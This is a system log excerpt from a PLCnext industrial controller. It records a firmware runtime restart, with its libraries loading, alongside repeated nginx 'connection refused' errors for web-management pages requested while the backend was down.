+Aug 24 23:54:44 axcf2152 sudo: plcnext_firmware : PWD=/var/volatile/tmp ; USER=root ; COMMAND=/etc/init.d/watchdog stop 29640
+Aug 24 23:54:44 axcf2152 watchdog[29640]: stopping daemon (5.16)
+Aug 24 23:54:45 axcf2152 nginx: 2024/08/24 23:54:45 [error] 1546#1546: *1415 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/IsSessionValid.cgi? HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:54:45 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - ResetPlc, isChanging=false
+Aug 24 23:54:45 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2945434432 OnPlcUnloaded PlcLoaded=true
+Aug 24 23:54:45 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2945434432 ESDK 0xffff, RemoveAllAssemblies
+Aug 24 23:54:45 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - UnloadPlc, isChanging=false
+Aug 24 23:54:45 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2945434432 OnPlcUnloaded PlcLoaded=false
+Aug 24 23:54:45 axcf2152 Arp.System.Application: Arp.Plc.Domain.Internal.PlcManager INFO - Plc state transition from 'Stop|Hot' to 'Ready'
+Aug 24 23:54:46 axcf2152 nginx: 2024/08/24 23:54:46 [error] 1546#1546: *1415 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PlcValues.cgi?projectname HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:54:46 axcf2152 Arp.System.Application: ehmiLib.EhmiLib INFO - 3069579296   Uninitialize 
+Aug 24 23:54:46 axcf2152 Arp.System.Application: Arp.Io.ProfinetStack.Controller.Internal.Controller INFO - Controller instance removed successfully
+Aug 24 23:54:46 axcf2152 Arp.System.Application: Arp.Io.ProfinetStack.Device.Internal.Device INFO - PN_RemoveDevInst with Id = 1!
+Aug 24 23:54:47 axcf2152 nginx: 2024/08/24 23:54:47 [error] 1546#1546: *1415 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/IsSessionValid.cgi? HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:54:48 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2945434432 Enter  Dispose
+Aug 24 23:54:48 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2945434432 Enter  Stop
+Aug 24 23:54:48 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2945434432 ESDK 0xffff, Stop
+Aug 24 23:54:48 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2945434432 Exit   Stop. Elapsed=102
+Aug 24 23:54:48 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - 2945434432 Exit   Dispose. Elapsed=103
+Aug 24 23:54:48 axcf2152 Arp.System.Application: Arp.Services.Ehmi.EhmiComponent INFO - 3069579296   ~EhmiComponent 
+Aug 24 23:54:48 axcf2152 Arp.System.Application: Arp.Io.EthernetIP.EthernetIPComponent INFO - ~EthernetIPComponent
+Aug 24 23:54:49 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.ApplicationBase INFO - Application 'ExternalIoProcess' terminates.
+Aug 24 23:54:49 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.ApplicationBase INFO - Application 'LocalIoProcess' terminates.
+Aug 24 23:54:49 axcf2152 Arp.System.Application: CommonRemoting INFO - Remote client disconnects explicitly, connectionId = AE2F2C9B
+Aug 24 23:54:49 axcf2152 Arp.System.Application: CommonRemoting INFO - Remote client disconnects explicitly, connectionId = AE2F09FB
+Aug 24 23:54:49 axcf2152 nginx: 2024/08/24 23:54:49 [error] 1546#1546: *1415 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/IsSessionValid.cgi? HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:54:51 axcf2152 nginx: 2024/08/24 23:54:51 [error] 1546#1546: *1415 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/IsSessionValid.cgi? HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:54:51 axcf2152 nginx: 2024/08/24 23:54:51 [error] 1546#1546: *1415 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PlcValues.cgi?projectname HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:54:53 axcf2152 nginx: 2024/08/24 23:54:53 [error] 1546#1546: *1415 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/IsSessionValid.cgi? HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:54:55 axcf2152 nginx: 2024/08/24 23:54:55 [error] 1546#1546: *1415 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/IsSessionValid.cgi? HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:54:56 axcf2152 nginx: 2024/08/24 23:54:56 [error] 1546#1546: *1415 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PlcValues.cgi?projectname HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:54:56 axcf2152 su[19155]: Successful su for plcnext_firmware by root
+Aug 24 23:54:56 axcf2152 su[19155]: + /dev/pts/2 root:plcnext_firmware
+Aug 24 23:54:56 axcf2152 su[19155]: pam_unix(su:session): session opened for user plcnext_firmware(uid=1001) by admin(uid=0)
+Aug 24 23:54:56 axcf2152 su[19155]: pam_unix(su:session): session closed for user plcnext_firmware
+Aug 24 23:54:56 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.ApplicationBase INFO - ArpVersion: 2022.9.0 (22.9.0.33)
+Aug 24 23:54:56 axcf2152 Arp.System.Application: CommonRemoting INFO - [IpcRemotingBroker]: Starting IPC Remoting Broker
+Aug 24 23:54:56 axcf2152 Arp.System.Application: CommonRemoting INFO - Starting remoting server (version=4)
+Aug 24 23:54:56 axcf2152 Arp.System.Application: CommonRemoting INFO - Start listening on IPC *
+Aug 24 23:54:56 axcf2152 Arp.System.Application: CommonRemoting INFO - Start listening on TCP port 41120
+Aug 24 23:54:56 axcf2152 Arp.System.Application: CommonRemoting INFO - Start listening on IPC MainProcess
+Aug 24 23:54:56 axcf2152 Arp.System.Application: CommonRemoting INFO - Start listening on TCP port 41121
+Aug 24 23:54:57 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Process 'MainProcess' started successfully.
+Aug 24 23:54:57 axcf2152 nginx: 2024/08/24 23:54:57 [error] 1546#1546: *1415 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/IsSessionValid.cgi? HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:54:57 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.ApplicationBase INFO - ArpVersion: 2022.9.0 (22.9.0.33)
+Aug 24 23:54:57 axcf2152 Arp.System.Application: CommonRemoting INFO - Starting remoting server (version=4)
+Aug 24 23:54:57 axcf2152 Arp.System.Application: CommonRemoting INFO - Start listening on IPC LocalIoProcess
+Aug 24 23:54:57 axcf2152 Arp.System.Application: CommonRemoting INFO - Start listening on TCP port 41124
+Aug 24 23:54:57 axcf2152 Arp.System.Application: CommonRemoting INFO - Accepted connection #0: connectionId=AE3F076B, ipc://<unknown>
+Aug 24 23:54:57 axcf2152 Arp.System.Application: CommonRemoting INFO - Accepted connection #1: connectionId=AE2F0833, ipc://<unknown>
+Aug 24 23:54:57 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.ApplicationBase INFO - ArpVersion: 2022.9.0 (22.9.0.33)
+Aug 24 23:54:57 axcf2152 Arp.System.Application: CommonRemoting INFO - Starting remoting server (version=4)
+Aug 24 23:54:57 axcf2152 Arp.System.Application: CommonRemoting INFO - Start listening on IPC ExternalIoProcess
+Aug 24 23:54:57 axcf2152 Arp.System.Application: CommonRemoting INFO - Accepted connection #0: connectionId=AE3F034B, ipc://<unknown>
+Aug 24 23:54:57 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.ApplicationBase INFO - Application 'LocalIoProcess' was setup successfully.
+Aug 24 23:54:57 axcf2152 Arp.System.Application: CommonRemoting INFO - Start listening on TCP port 41123
+Aug 24 23:54:57 axcf2152 Arp.System.Application: CommonRemoting INFO - Accepted connection #2: connectionId=AE3F5A2B, ipc://<unknown>
+Aug 24 23:54:57 axcf2152 Arp.System.Application: CommonRemoting INFO - Accepted connection #3: connectionId=AE2F2C9B, ipc://<unknown>
+Aug 24 23:54:57 axcf2152 Arp.System.Application: CommonRemoting INFO - Accepted connection #0: connectionId=AE3F09B3, ipc://<unknown>
+Aug 24 23:54:57 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.ApplicationBase INFO - Application 'ExternalIoProcess' was setup successfully.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Process 'ExternalIoProcess' started successfully.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Process 'LocalIoProcess' started successfully.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Io.EthernetIP.Library' in process 'ExternalIoProcess' loaded.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Io.Profinet.Library' in process 'ExternalIoProcess' loaded.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Plc.Domain.Library' in process 'ExternalIoProcess' loaded.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.System.UmRscAuthorizator.Library' in process 'ExternalIoProcess' loaded.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Io.Axioline.Library' in process 'LocalIoProcess' loaded.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Plc.Domain.Library' in process 'LocalIoProcess' loaded.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.System.UmRscAuthorizator.Library' in process 'LocalIoProcess' loaded.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Device.HmiLed.Library' in process 'MainProcess' loaded.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Device.Interface.Library' in process 'MainProcess' loaded.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Hardware.DeviceHmi.Library' in process 'MainProcess' loaded.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Hardware.ExternalPci.Library' in process 'MainProcess' loaded.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Hardware.ExternalSDCard.Library' in process 'MainProcess' loaded.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Hardware.FanControl.Library' in process 'MainProcess' loaded.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Hardware.Fpga.Library' in process 'MainProcess' loaded.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Hardware.IdentificationData.Library' in process 'MainProcess' loaded.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Hardware.Nim.Library' in process 'MainProcess' loaded.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Hardware.OsControl.Library' in process 'MainProcess' loaded.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Hardware.RealTimeClock.Library' in process 'MainProcess' loaded.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Hardware.ResourceMonitor.Library' in process 'MainProcess' loaded.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Hardware.Sensors.Library' in process 'MainProcess' loaded.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Plc.Domain.Library' in process 'MainProcess' loaded.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Plc.Eclr.Library' in process 'MainProcess' loaded.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Plc.Esm.Library' in process 'MainProcess' loaded.
+Aug 24 23:54:58 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Plc.Fbm.Library' in process 'MainProcess' loaded.
+Aug 24 23:54:59 axcf2152 nginx: 2024/08/24 23:54:59 [error] 1546#1546: *1415 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/IsSessionValid.cgi? HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:54:59 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Plc.Gds.Library' in process 'MainProcess' loaded.
+Aug 24 23:54:59 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Plc.Meta.Library' in process 'MainProcess' loaded.
+Aug 24 23:54:59 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Plc.Plm.Library' in process 'MainProcess' loaded.
+Aug 24 23:54:59 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Plc.Retain.Library' in process 'MainProcess' loaded.
+Aug 24 23:54:59 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.Alarms.Library' in process 'MainProcess' loaded.
+Aug 24 23:54:59 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.AppManager.Library' in process 'MainProcess' loaded.
+Aug 24 23:54:59 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.DataLogger.Library' in process 'MainProcess' loaded.
+Aug 24 23:54:59 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.Ehmi.Library' in process 'MainProcess' loaded.
+Aug 24 23:54:59 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.Fwm.Library' in process 'MainProcess' loaded.
+Aug 24 23:55:00 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.Grpc.Library' in process 'MainProcess' loaded.
+Aug 24 23:55:00 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.LinuxSyslog.Library' in process 'MainProcess' loaded.
+Aug 24 23:55:00 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.NmUtilities.Library' in process 'MainProcess' loaded.
+Aug 24 23:55:00 axcf2152 Arp.System.Application: Arp.System.Acf.Internal.Sm.ProcessesController INFO - Library 'Arp.Services.NotificationLogger.Library' in process 'MainProcess' loaded.
+Aug 24 23:55:01 axcf2152 nginx: 2024/08/24 23:55:01 [error] 1546#1546: *1415 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/IsSessionValid.cgi? HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:01 axcf2152 nginx: 2024/08/24 23:55:01 [error] 1546#1546: *1415 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PlcValues.cgi?projectname HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:03 axcf2152 nginx: 2024/08/24 23:55:03 [error] 1546#1546: *1415 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/IsSessionValid.cgi? HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:04 axcf2152 nginx: 2024/08/24 23:55:04 [error] 1546#1546: *1415 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "GET /wbm/Main.html HTTP/1.1", subrequest: "/wbm/InfoValues.cgi", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10"
+Aug 24 23:55:04 axcf2152 nginx: 2024/08/24 23:55:04 [error] 1546#1546: *1415 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "GET /wbm/Main.html HTTP/1.1", subrequest: "/wbm/MainMetaContent.cgi", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10"
+Aug 24 23:55:04 axcf2152 nginx: 2024/08/24 23:55:04 [error] 1543#1543: *1592 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "GET /wbm/IsSessionValid.cgi?_=1724536522709 HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:04 axcf2152 nginx: 2024/08/24 23:55:04 [error] 1542#1542: *1594 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "GET /wbm/ProlongSession.cgi?_=1724536522710 HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:04 axcf2152 nginx: 2024/08/24 23:55:04 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/HmiControl.cgi?GetLink HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:04 axcf2152 nginx: 2024/08/24 23:55:04 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/InfoValues.cgi?hwversion HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:04 axcf2152 nginx: 2024/08/24 23:55:04 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/InfoValues.cgi?shortfwversion HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:04 axcf2152 nginx: 2024/08/24 23:55:04 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/InfoValues.cgi?mac[1] HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:04 axcf2152 nginx: 2024/08/24 23:55:04 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/InfoValues.cgi?artname HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:04 axcf2152 nginx: 2024/08/24 23:55:04 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/InfoValues.cgi?ordernum HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:04 axcf2152 nginx: 2024/08/24 23:55:04 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PageLink.cgi?moduleName=Di&pageName=GeneralData HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:04 axcf2152 nginx: 2024/08/24 23:55:04 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PageLink.cgi?moduleName=FanControl&pageName=FanControlConfiguration HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:04 axcf2152 nginx: 2024/08/24 23:55:04 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PageLink.cgi?moduleName=NetConf&pageName=NetworkConfiguration HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:04 axcf2152 nginx: 2024/08/24 23:55:04 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PageLink.cgi?moduleName=PLCnextStore&pageName=PLCnextStore HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PageLink.cgi?moduleName=ProfiCloudV3&pageName=ProficloudServices HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PageLink.cgi?moduleName=RealTimeClock&pageName=DateTime HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PageLink.cgi?moduleName=Scm&pageName=SystemServices HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PageLink.cgi?moduleName=Splc&pageName=SplcConfiguration HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PageLink.cgi?moduleName=Wcm&pageName=WebConfiguration HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PageLink.cgi?moduleName=LocalBusDiag&pageName=LocalBusDiagnostics HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PageLink.cgi?moduleName=NotificationLog&pageName=NotificationLog HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PageLink.cgi?moduleName=Profinet&pageName=ProfinetDiagnostics HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PageLink.cgi?moduleName=CertificateAuthentication&pageName=Certificates HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx
+: 2024/08/24 23:55:05 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PageLink.cgi?moduleName=Fwm&pageName=Firewall HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PageLink.cgi?moduleName=SdCard&pageName=SdCardConfiguration HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PageLink.cgi?moduleName=Spm&pageName=SecurityProfile HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PageLink.cgi?moduleName=AppManager&pageName=PLCnextApps HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PageLink.cgi?moduleName=FirmwareUpdater&pageName=FirmwareUpdate HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
+Aug 24 23:55:05 axcf2152 nginx: 2024/08/24 23:55:05 [error] 1543#1543: *1596 connect() failed (111: Connection refused) while connecting to upstream, client: 192.168.137.50, server: , request: "POST /wbm/PageLink.cgi?moduleName=Lm&pageName=LicenseManager HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "192.168.137.10", referrer: "https://192.168.137.10/wbm/Main.html"
